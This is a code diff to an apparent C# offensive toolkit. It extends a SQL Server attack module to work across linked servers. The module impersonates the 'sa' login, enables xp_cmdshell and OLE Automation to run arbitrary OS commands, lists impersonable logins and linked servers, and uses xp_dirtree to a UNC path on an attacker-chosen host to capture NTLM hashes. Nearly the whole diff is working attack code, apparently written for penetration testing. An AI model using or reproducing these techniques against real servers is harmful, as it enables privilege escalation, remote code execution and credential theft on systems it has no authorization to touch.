@@ -9,73 +9,104 @@ namespace ExtensionToolkit.Func
     {
         public static void Sql(string[] args)
         {
+            var sqlHelpMap = new Dictionary<string, string>
+            {
+                { "check_login", "Args: <server> <database> (e.g master) ?<linkedServer>" },
+                { "path_injection", "Args: <server> <database> <targetHost> ?<linkedServer>" },
+                { "list_impersonable", "Args: <server> <database>" },
+                { "list_links", "Args: <server> <database>" },
+                { "impersonate_login", "Args: <server> <database> <targetUser>, ?<linkedServer>" },
+                { "impersonate_user", "Args: <server> <database> <targetUser>, ?<linkedServer>" },
+                { "exec_xpcmdshell", "Args: <server> <database> <command>" },
+                { "exec_oamethod", "Args: <server> <database> <command>" }
+            };
             // sql list_impersonable dc01.corp1.com master
-            if (args.Length < 3)
+            if (args.Length == 2 && args[1].Equals("help")){
+
+                Console.WriteLine("Available operations and expected arguments:");
+                foreach (var entry in sqlHelpMap)
+                {
+                    Console.WriteLine($"- {entry.Key}: {entry.Value}");
+                }
+
+                return;
+            }
+            else if (args.Length < 3)
             {
                 Console.WriteLine("Mandatory args: operation, server, db");
                 return;
             }
 
-            string operation = args[1]; // Corrigido para args[0] para pegar a operação
-            string sqlServer = args[2];
-            string db = args[3];
+            bool isLinked = args[1].Equals("linked");
+
+            string operation = isLinked ? args[2] : args[1];
+            string sqlServer = isLinked ? args[3] : args[2];
+            string db = isLinked ? args[4] : args[3];
+            string linkedServer = isLinked? args[args.Length - 1] : null;
 
             SqlConnection con = AuthSql(sqlServer, db);
 
             var sqlMap = new Dictionary<string, Action>
             {
-                { "check_login", () => CheckUserAndPriv(con) },
+                { "check_login", () => {
+                    CheckUserAndPriv(con, linkedServer);
+                }},
                 { "path_injection", () => {
-                        string targetHost = args.Length > 4 ? args[4] : null;
-                        if (targetHost == null)
-                        {
-                            Console.WriteLine("Error: targetHost is required for path_injection. Pass target IP Address instead of hostname");
-                            return;
-                        }
-                        PathInjection(con, targetHost);
+                    string targetHost = isLinked ? args[5] : args[4];
+                    if (targetHost == null)
+                    {
+                        Console.WriteLine("Error: targetHost is required for path_injection. Pass target IP Address instead of hostname");
+                        return;
                     }
-                },
-                { "list_impersonable", () => ListImpersonables(con) },
+                    PathInjection(con, targetHost, linkedServer);
+                }},
+                { "list_impersonable", () => {
+                    ListImpersonables(con, linkedServer);
+                }},
+                { "list_links", () => {
+                    ListLinks(con, linkedServer);
+                }},
                 { "impersonate_login", () => {
-                        string targetUser = args.Length > 4 ? args[4] : null;
-                        if (targetUser == null)
-                        {
-                            Console.WriteLine("Error: target user is required for impersonation");
-                            return;
-                        }
-                        ExecuteImpersonationLogin(con, targetUser);                        
+                    string targetUser = isLinked ? args[4] : args[3];
+                    if (targetUser == null)
+                    {
+                        Console.WriteLine("Error: target user is required for impersonation");
+                        return;
                     }
-                },
+                    ExecuteImpersonationLogin(con, targetUser, linkedServer);
+                }},
                 { "impersonate_user", () => {
-                        string targetUser = args.Length > 4 ? args[4] : null;
-                        if (targetUser == null)
-                        {
-                            Console.WriteLine("Error: target user is required for impersonation");
-                            return;
-                        }
-                        ExecuteImpersonationUser(con, targetUser);
+                    string targetUser = isLinked ? args[4] : args[3];
+                    if (targetUser == null)
+                    {
+                        Console.WriteLine("Error: target user is required for impersonation");
+                        return;
                     }
-                },
+                    ExecuteImpersonationUser(con, targetUser, linkedServer);
+                }},
                 { "exec_xpcmdshell", () => {
-                        if (args.Length <= 4)
-                        {
-                            Console.WriteLine("Error: cmd needed");
-                            return;
-                        }
-                        string cmd = string.Join(" ", args.Skip(4));
-                        ExecuteXpCmdshell(con, cmd);
+                    if (args.Length < (isLinked ? 7 : 5))
+                    {
+                        Console.WriteLine("Error: cmd needed");
+                        return;
                     }
-                },
+
+                    string cmd = string.Join(" ", args.Skip(isLinked ? 5 : 4).Take(isLinked ? args.Length - 6 : args.Length - 4));
+                    Console.WriteLine($"cmd {cmd}");
+                    Console.WriteLine($"server {linkedServer}");
+                    ExecuteXpCmdshell(con, cmd, linkedServer);
+                }},
                 { "exec_oamethod", () => {
-                        if (args.Length <= 4)
-                        {
-                            Console.WriteLine("Error: cmd needed");
-                            return;
-                        }
-                        string cmd = string.Join(" ", args.Skip(4));
-                        ExecuteOaMethod(con, cmd);
+                    // Verifica se há argumentos suficientes
+                    if (args.Length < (isLinked ? 7 : 5))
+                    {
+                        Console.WriteLine("Error: cmd needed");
+                        return;
                     }
-                },
+
+                    string cmd = string.Join(" ", args.Skip(isLinked ? 5 : 4).Take(isLinked ? args.Length - 6 : args.Length - 4));
+                    ExecuteOaMethod(con, cmd, linkedServer); 
+                }},
             };
 
             if (sqlMap.TryGetValue(operation, out Action action))
@@ -119,93 +150,160 @@ namespace ExtensionToolkit.Func
             return con;
         }
 
-        public static void ExecuteImpersonationUser(SqlConnection con, string user)
+        public static void ExecuteImpersonationUser(SqlConnection con, string user, string linkedServer = null)
         {
-            String executeas = $"use msdb; EXECUTE AS USER = '{user}';";
-            SqlCommand command = new SqlCommand(executeas, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+            // Monta a query para executar a impersonação do usuário
+            string executeAs = linkedServer != null
+                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS USER = ''{user}'';'"
+                : $"USE msdb; EXECUTE AS USER = '{user}';";
 
+            // Executa a query
+            ExecuteScalarQuery(con, executeAs);
+
+            // Verifica as novas permissões após a impersonação
             Console.WriteLine($"New Privileges: ");
-            CheckUserAndPriv(con);
+            CheckUserAndPriv(con, linkedServer);
         }
 
-        public static void ExecuteImpersonationLogin(SqlConnection con, string user)
+        public static void ExecuteImpersonationLogin(SqlConnection con, string user, string linkedServer = null)
         {
-            String executeas = $"EXECUTE AS LOGIN = '{user}';";
-            SqlCommand command = new SqlCommand(executeas, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+            // Monta a query para executar a impersonação do login
+            string executeAs = linkedServer != null
+                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS LOGIN = ''{user}'';'"
+                : $"EXECUTE AS LOGIN = '{user}';";
+
+            // Executa a query
+            ExecuteScalarQuery(con, executeAs);
+
+            // Verifica as novas permissões após a impersonação
             Console.Write($"New Privileges: ");
-            CheckUserAndPriv(con);
+            CheckUserAndPriv(con, linkedServer);
         }
 
-        public static void ExecuteXpCmdshell(SqlConnection con, string cmd)
+        public static void ExecuteXpCmdshell(SqlConnection con, string cmd, string linkedServer = null)
         {
-            ExecuteImpersonationLogin(con, "sa");
-            
-            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
-            String execCmd = $"EXEC xp_cmdshell {cmd}";
+            ExecuteImpersonationLogin(con, "sa", linkedServer);
 
-            Console.WriteLine($"executing {execCmd}");
+            // Comandos para habilitar xp_cmdshell
+            string enableXpcmd = linkedServer != null
+                ? $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {linkedServer};"
+                : "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
 
-            SqlCommand  command = new SqlCommand(enable_xpcmd, con);
-            SqlDataReader  reader = command.ExecuteReader();
-            reader.Close();
+            // Verifica se linkedServer está presente
+            string execCmd = linkedServer != null
+                ? $"EXEC ('EXEC xp_cmdshell ''{cmd}''') AT {linkedServer};"
+                : $"EXEC xp_cmdshell '{cmd}'";
 
-            command = new SqlCommand(execCmd, con);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("Result of command is: " + reader[0]);
-            reader.Close();
+            // Executa o comando para habilitar xp_cmdshell
+            Console.WriteLine($"Enabling xp_cmdshell...");
+            ExecuteNonQuery(con, enableXpcmd);
+
+            // Executa o comando principal
+            Console.WriteLine($"Executing: {execCmd}");
+            var result = ExecuteScalarQuery(con, execCmd);
+
+            Console.WriteLine("Result of command is: " + result);
         }
 
-        public static void ExecuteOaMethod(SqlConnection con, string cmd)
+        public static void ExecuteOaMethod(SqlConnection con, string cmd, string linkedServer = null)
         {
-            ExecuteImpersonationLogin(con, "sa");
+            ExecuteImpersonationLogin(con, "sa", linkedServer);
 
-            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-            String execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
-            Console.WriteLine($"executing {execCmd}");
+            string enableOle = linkedServer != null
+                ? $"EXEC ('EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT {linkedServer};"
+                : "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
 
-            SqlCommand command = new SqlCommand(enable_ole, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+            string execCmd = linkedServer != null
+                ? $"EXEC {linkedServer}.master.dbo.sp_executesql N'DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"{cmd}\"'';'"
+                : $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
 
-            command = new SqlCommand(execCmd, con);
-            reader = command.ExecuteReader();
-            reader.Close();
+            Console.WriteLine($"Enabling Ole Automation Procedures...");
+            ExecuteScalarQuery(con, enableOle);
+
+            Console.WriteLine($"Executing: {execCmd}");
+            var result = ExecuteScalarQuery(con, execCmd);
+            Console.WriteLine("Result of command is: " + result);
         }
 
-        public static void ListImpersonables(SqlConnection con)
+
+        public static void ListImpersonables(SqlConnection con, string linkedServer = null)
         {
-            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            string query = "SELECT DISTINCT b.name " +
+                           "FROM sys.server_permissions a " +
+                           "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
+                           "WHERE a.permission_name = 'IMPERSONATE';";
+
+            if (!string.IsNullOrEmpty(linkedServer))
+            {
+                query = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT DISTINCT b.name " +
+                         "FROM sys.server_permissions a " +
+                         "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
+                         "WHERE a.permission_name = ''IMPERSONATE'';');";
+            }
+
+            Console.WriteLine($"Attempting to execute: {query}");
+
+            // Usando ExecuteScalarQuery para retornar o valor
+            var impersonable = ExecuteScalarQuery(con, query);
+            if (impersonable != null)
+            {
+                Console.WriteLine($"Impersonable users: {impersonable}");
+            }
+            else
+            {
+                Console.WriteLine("No impersonable users found.");
+            }
+        }
+
+        public static void ListLinks(SqlConnection con, string linkedServer = null)
+        {
+            string query;
+
+            if (!string.IsNullOrEmpty(linkedServer))
+            {
+                query = $"EXEC ('EXEC sp_linkedservers') AT {linkedServer};";
+            }
+            else
+            {
+                query = $"EXEC sp_linkedservers;";
+            }
+
             Console.WriteLine($"Attempting to execute: {query}");
 
             SqlCommand command = new SqlCommand(query, con);
             SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            var impersonable = reader[0].ToString();
-            Console.WriteLine($"Impersonable users: {impersonable}");
+
+            while (reader.Read())
+            {
+                Console.WriteLine("Linked SQL server: " + reader[0]);
+            }
+
             reader.Close();
         }
 
         // If the hostname is given as an IP address, Windows will automatically revert to NTLM authentication instead of Kerberos authentication, giving us the hash
-        public static void PathInjection(SqlConnection con, string host)
+        public static void PathInjection(SqlConnection con, string host, string linkedServer = null)
         {
-            string query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
+            string query;
+
+            if (!string.IsNullOrEmpty(linkedServer))
+            {
+                query = $"EXEC ('EXEC master..xp_dirtree \"\\\\{host}\\\\test\"') AT {linkedServer};";
+            }
+            else
+            {
+                query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
+            }
             Console.WriteLine($"Attempting to execute: {query}");
 
             using (SqlCommand command = new SqlCommand(query, con))
             {
-                // Define o tempo limite para 30 segundos
                 command.CommandTimeout = 30;
 
                 try
                 {
                     using (SqlDataReader reader = command.ExecuteReader())
                     {
-                        // Processa os resultados aqui, se necessário
                     }
                 }
                 catch (SqlException ex)
@@ -215,58 +313,52 @@ namespace ExtensionToolkit.Func
             }
         }
 
-        public static void CheckUserAndPriv(SqlConnection con)
+        public static void CheckUserAndPriv(SqlConnection con, string linkedServer = null)
         {
 
             string queryLogin = "SELECT SYSTEM_USER;";
             string queryUser = "SELECT USER_NAME();";
-            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
-            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
-            string publicRole, adminRole;
+            string queryPublicRole = "SELECT IS_SRVROLEMEMBER('public');";
+            string querySysAdminRole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+            string queryServerName = "SELECT @@SERVERNAME;";
 
-            SqlCommand command = new SqlCommand(queryLogin, con);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            var login = reader[0].ToString();
-            reader.Close();
-
-            command = new SqlCommand(queryUser, con);
-            reader = command.ExecuteReader();
-            reader.Read();
-            var user = reader[0].ToString();
-            reader.Close();
-
-            command = new SqlCommand(querypublicrole, con);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Int32 isPublic = Int32.Parse(reader[0].ToString());
-            reader.Close();
-
-            command = new SqlCommand(querysysadminrole, con);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Int32 isAdmin = Int32.Parse(reader[0].ToString());
-            reader.Close();
-
-            if (isPublic == 1)
+            if (!string.IsNullOrEmpty(linkedServer))
             {
-                publicRole = "member of public role";
-            }
-            else
-            {
-                publicRole = "not member of public role";
+                queryLogin = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT SYSTEM_USER;')";
+                queryUser = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT USER_NAME();')";
+                queryPublicRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''public'');')";
+                querySysAdminRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''sysadmin'');')";
+                queryServerName = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT @@SERVERNAME;')";
             }
 
-            if (isAdmin == 1)
-            {
-                adminRole = "member of sysadmin role";
-            }
-            else
-            {
-                adminRole = "not member of sysadmin role";
-            }
+            string login = ExecuteScalarQuery(con, queryLogin);
+            string user = ExecuteScalarQuery(con, queryUser);
+            int isPublic = int.Parse(ExecuteScalarQuery(con, queryPublicRole));
+            int isAdmin = int.Parse(ExecuteScalarQuery(con, querySysAdminRole));
+            string serverName = ExecuteScalarQuery(con, queryServerName);
 
-            Console.WriteLine($"Login: {login}, Mapped User: {user}, {publicRole}, {adminRole}");
+            string publicRole = (isPublic == 1) ? "member of public role" : "not member of public role";
+            string adminRole = (isAdmin == 1) ? "member of sysadmin role" : "not member of sysadmin role";
+
+            Console.WriteLine($"SQL Server: {serverName}, Login: {login}, Mapped User: {user}, {publicRole}, {adminRole}");
+        }
+
+        private static string ExecuteScalarQuery(SqlConnection con, string query)
+        {
+            using (SqlCommand command = new SqlCommand(query, con))
+            {
+                command.CommandTimeout = 30; // Definindo tempo limite
+                return command.ExecuteScalar()?.ToString(); // Usando ExecuteScalar para retornar um único valor
+            }
+        }
+
+        private static void ExecuteNonQuery(SqlConnection con, string query)
+        {
+            using (SqlCommand command = new SqlCommand(query, con))
+            {
+                command.CommandTimeout = 30; // Definindo tempo limite
+                command.ExecuteNonQuery(); // Executa a consulta sem retornar resultados
+            }
         }
     }
 }
